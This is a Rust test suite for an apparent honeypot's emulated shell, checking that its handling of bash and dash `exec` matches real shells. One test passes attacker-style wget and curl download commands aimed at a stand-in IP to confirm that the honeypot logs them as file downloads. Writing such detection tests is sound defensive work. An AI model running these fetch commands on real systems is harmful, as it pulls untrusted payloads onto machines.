//! `exec` end to end: the descriptors it opens and closes, the command it runs in place of the
//! shell, and where the shell ends. Every reply asserted here was produced by Ubuntu 22.04's bash
//! 5.1.16 or dash 0.5.11 in the `propolis-survey-ref:jammy` container (see `ubuntu-bash-exec.session`,
//! `ubuntu-dash-exec.session`); a test that says `[inferred]` has no reference shell (mksh).

use crate::fakefs::FakeFs;
use crate::shell::{EmitContext, FakeShell};
use sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "ssh".to_string(),
        session_id: None,
    }
}

fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

fn run(sh: &mut FakeShell, line: &str) -> String {
    sh.handle_input(line).0.to_string()
}

#[test]
fn a_descriptor_exec_opens_is_written_to_by_later_commands_and_closed_by_exec() {
    let mut sh = shell();
    assert_eq!(run(&mut sh, "exec 3>/tmp/x1"), "");
    run(&mut sh, "echo one >&3");
    run(&mut sh, "echo two >&3");
    assert_eq!(run(&mut sh, "cat /tmp/x1"), "one\ntwo\n");
    run(&mut sh, "exec 3>&-");
    assert_eq!(
        run(&mut sh, "echo three >&3"),
        "-bash: 3: Bad file descriptor\n"
    );
    assert_eq!(run(&mut sh, "cat /tmp/x1"), "one\ntwo\n");
}

#[test]
fn a_file_exec_opens_for_reading_is_read_from_where_the_last_read_stopped() {
    let mut sh = shell();
    run(&mut sh, "printf 'a\\nb\\nc\\n' > /tmp/x2");
    run(&mut sh, "exec 4</tmp/x2");
    run(&mut sh, "read -u 4 first");
    run(&mut sh, "read -u 4 second");
    assert_eq!(run(&mut sh, "echo $first $second"), "a b\n");
    assert_eq!(run(&mut sh, "cat <&4"), "c\n");
    run(&mut sh, "exec 4<&-");
    assert_eq!(
        run(&mut sh, "read -u 4 x"),
        "-bash: read: 4: invalid file descriptor: Bad file descriptor\n"
    );
}

#[test]
fn copying_a_descriptor_that_is_not_open_is_refused() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "exec 5>&99"),
        "-bash: 99: Bad file descriptor\n"
    );
    assert_eq!(
        run(&mut sh, "exec 5>&abc"),
        "-bash: abc: ambiguous redirect\n"
    );
    assert_eq!(
        run(&mut sh, "echo hi >&7"),
        "-bash: 7: Bad file descriptor\n"
    );
}

#[test]
fn exec_redirecting_output_hides_it_until_it_is_pointed_back() {
    let mut sh = shell();
    run(&mut sh, "exec >/tmp/x3");
    assert_eq!(run(&mut sh, "echo hidden"), "");
    run(&mut sh, "exec >&2");
    assert_eq!(run(&mut sh, "echo shown"), "shown\n");
    run(&mut sh, "exec >/dev/tty");
    assert_eq!(run(&mut sh, "cat /tmp/x3"), "hidden\n");
}

#[test]
fn a_closed_standard_output_is_a_write_error_in_the_words_of_the_writer() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "echo hi >&-"),
        "-bash: echo: write error: Bad file descriptor\n"
    );
    assert_eq!(
        run(&mut sh, "/bin/echo hi >&-"),
        "/bin/echo: write error: Bad file descriptor\n"
    );
    assert_eq!(
        run(&mut sh, "uname >&-"),
        "uname: write error: Bad file descriptor\n"
    );
    assert_eq!(
        run(&mut sh, "cat /etc/hostname >&-"),
        "cat: standard output: Bad file descriptor\n"
    );
    assert_eq!(run(&mut sh, "true >&-"), "");
}

#[test]
fn descriptors_pass_to_subshells_functions_and_shells_it_starts() {
    let mut sh = shell();
    run(&mut sh, "exec 3>/tmp/x4");
    run(&mut sh, "(echo sub >&3)");
    run(&mut sh, "{ echo brace >&3; }");
    run(&mut sh, "f() { echo fn >&3; }; f");
    run(&mut sh, "sh -c 'echo child >&3'");
    assert_eq!(run(&mut sh, "cat /tmp/x4"), "sub\nbrace\nfn\nchild\n");
    // A descriptor a subshell opens is its own.
    run(&mut sh, "(exec 6>/tmp/x5; echo six >&6)");
    assert_eq!(
        run(&mut sh, "echo late >&6"),
        "-bash: 6: Bad file descriptor\n"
    );
}

#[test]
fn a_function_that_runs_exec_changes_the_shells_descriptors() {
    let mut sh = shell();
    run(&mut sh, "f() { exec 7>/tmp/x6; }");
    run(&mut sh, "f");
    run(&mut sh, "echo seven >&7");
    assert_eq!(run(&mut sh, "cat /tmp/x6"), "seven\n");
}

#[test]
fn exec_with_a_command_replaces_a_subshell_and_a_script_but_not_the_shell_around_it() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "(exec echo replaced; echo not-reached); echo $?"),
        "replaced\n0\n"
    );
    assert_eq!(
        run(&mut sh, "sh -c 'exec echo via; echo not-reached'"),
        "via\n"
    );
    assert_eq!(run(&mut sh, "echo $(exec echo cs; echo no)"), "cs\n");
    assert_eq!(run(&mut sh, "echo still"), "still\n");
}

#[test]
fn exec_with_a_command_does_not_run_the_exit_handler() {
    let mut sh = shell();
    assert_eq!(
        run(
            &mut sh,
            "sh -c 'trap \"echo bye\" EXIT; exec echo replaced'"
        ),
        "replaced\n"
    );
    assert_eq!(
        run(
            &mut sh,
            "sh -c 'trap \"echo bye\" EXIT; (exec true); echo after'"
        ),
        "after\nbye\n"
    );
}

#[test]
fn a_command_exec_cannot_start_is_not_found_and_a_builtin_never_is() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "(exec nosuchcmd_q; echo not-reached); echo $?"),
        "-bash: exec: nosuchcmd_q: not found\n127\n"
    );
    assert_eq!(
        run(&mut sh, "(exec cd /tmp); echo $?"),
        "-bash: exec: cd: not found\n127\n"
    );
    run(&mut sh, "f() { :; }");
    assert_eq!(
        run(&mut sh, "(exec f); echo $?"),
        "-bash: exec: f: not found\n127\n"
    );
    assert_eq!(
        run(&mut sh, "(exec /nonexistent/x); echo $?"),
        "-bash: /nonexistent/x: No such file or directory\n127\n"
    );
    assert_eq!(
        run(&mut sh, "(exec /tmp); echo $?"),
        "-bash: /tmp: Is a directory\n-bash: exec: /tmp: cannot execute: Is a directory\n126\n"
    );
}

#[test]
fn an_interactive_bash_survives_an_exec_that_could_not_start() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "exec nosuchcmd_q"),
        "-bash: exec: nosuchcmd_q: not found\n"
    );
    assert_eq!(run(&mut sh, "echo alive"), "alive\n");
}

#[test]
fn exec_options_are_bashs_and_a_bad_one_prints_the_usage_line() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "(exec -z); echo $?"),
        "-bash: exec: -z: invalid option\n\
         exec: usage: exec [-cl] [-a name] [command [argument ...]] [redirection ...]\n2\n"
    );
    assert_eq!(
        run(&mut sh, "(exec -a); echo $?"),
        "-bash: exec: -a: option requires an argument\n\
         exec: usage: exec [-cl] [-a name] [command [argument ...]] [redirection ...]\n2\n"
    );
    assert_eq!(run(&mut sh, "exec -a named bash -c 'echo $0'"), "named\n");
}

#[test]
fn exec_with_a_command_at_the_terminal_ends_the_session_when_the_command_does() {
    let mut sh = shell();
    let (result, _) = sh.handle_input("exec echo hi >/tmp/x7");
    assert!(result.close_session);
    assert_eq!(result.to_string(), "");
    assert!(!sh.fs.file_exists("/nonexistent"));
}

#[test]
fn exec_bash_at_the_terminal_replaces_the_shell_and_the_session_goes_on() {
    let mut sh = shell();
    run(&mut sh, "FOO=1; export BAR=2");
    let (result, _) = sh.handle_input("exec bash");
    assert!(!result.close_session);
    assert_eq!(run(&mut sh, "echo [$FOO][$BAR]"), "[][2]\n");
    let (result, _) = sh.handle_input("exit");
    assert!(result.close_session);
    assert_eq!(result.to_string(), "exit\n");
}

#[test]
fn exec_reading_a_file_at_the_terminal_runs_it_and_ends_the_session() {
    let mut sh = shell();
    run(&mut sh, "printf 'echo from-file\\n' > /tmp/x8");
    let (result, _) = sh.handle_input("exec < /tmp/x8");
    assert_eq!(result.to_string(), "from-file\nlogout\n");
    assert!(result.close_session);
}

#[test]
fn the_prompt_goes_with_standard_error() {
    let mut sh = shell();
    assert!(!sh.prompt().is_empty());
    run(&mut sh, "exec 2>/dev/null");
    assert_eq!(sh.prompt(), "");
    run(&mut sh, "exec 2>&1");
    assert!(!sh.prompt().is_empty());
}

#[test]
fn a_download_run_through_exec_is_reported_as_one_run_any_other_way_is() {
    let mut sh = shell();
    let (_, events) = sh.handle_input("(exec wget -q http://198.51.100.9/x -O /tmp/x9)");
    let urls: Vec<_> = events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .map(|e| e.metadata["url"].as_str().unwrap_or("-").to_string())
        .collect();
    assert_eq!(urls, vec!["http://198.51.100.9/x".to_string()]);
    let (_, events) = sh.handle_input("U=http://198.51.100.9; (exec curl -s $U/y -o /tmp/y)");
    let urls: Vec<_> = events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .map(|e| e.metadata["url"].as_str().unwrap_or("-").to_string())
        .collect();
    assert_eq!(urls, vec!["http://198.51.100.9/y".to_string()]);
}

#[test]
fn more_descriptors_than_a_shell_holds_are_ignored() {
    let mut sh = shell();
    assert_eq!(run(&mut sh, "exec 99>/tmp/x10; echo $?"), "0\n");
    assert_eq!(run(&mut sh, "echo ok"), "ok\n");
}

#[test]
fn dash_words_a_redirection_it_cannot_make_in_its_own_way_and_exits_2() {
    let mut sh = shell();
    run(&mut sh, "sh");
    assert_eq!(
        run(&mut sh, "echo hi > /nonexistent/x; echo rc=$?"),
        "sh: 1: cannot create /nonexistent/x: Directory nonexistent\nrc=2\n"
    );
    assert_eq!(
        run(&mut sh, "echo a > /tmp; echo rc=$?"),
        "sh: 2: cannot create /tmp: Is a directory\nrc=2\n"
    );
}

#[test]
fn dash_ends_the_shell_when_a_redirection_of_exec_fails() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "sh -c 'exec > /nonexistent/x; echo rc=$?'"),
        "sh: 1: cannot create /nonexistent/x: Directory nonexistent\n"
    );
}

#[test]
fn exec_clear_environment_runs_the_command_with_no_variables() {
    let mut sh = shell();
    run(&mut sh, "export FOO=bar");
    assert_eq!(
        run(&mut sh, "(exec -c /usr/bin/env)"),
        "",
        "`exec -c env` prints nothing: the variables are gone"
    );
}

#[test]
fn exec_that_cannot_start_in_a_script_runs_the_exit_handler_before_the_shell_ends() {
    let mut sh = shell();
    assert_eq!(
        run(
            &mut sh,
            "bash -c 'trap \"echo bye\" EXIT; exec nosuchcmd_q; echo not-reached'"
        ),
        "bash: line 1: exec: nosuchcmd_q: not found\nbye\n"
    );
}

#[test]
fn a_shell_that_replaced_the_login_shell_starts_with_no_history() {
    let mut sh = shell();
    run(&mut sh, "echo one");
    run(&mut sh, "exec bash");
    assert_eq!(run(&mut sh, "history"), "    1  history\n");
}

#[test]
fn a_failed_exec_ends_a_subshell_bash_runs_the_handler_for_a_missing_command_only() {
    let mut sh = shell();
    assert_eq!(
        run(&mut sh, "(trap 'echo bye' EXIT; exec nosuchcmd_q); echo $?"),
        "-bash: exec: nosuchcmd_q: not found\nbye\n0\n",
        "the handler's last command sets the status"
    );
    assert_eq!(
        run(&mut sh, "(trap 'echo bye' EXIT; exec /tmp); echo $?"),
        "-bash: /tmp: Is a directory\n-bash: exec: /tmp: cannot execute: Is a directory\n126\n"
    );
    assert_eq!(
        run(
            &mut sh,
            "sh -c 'trap \"echo bye\" EXIT; exec nosuchcmd_q'; echo $?"
        ),
        "sh: 1: exec: nosuchcmd_q: not found\nbye\n127\n"
    );
}
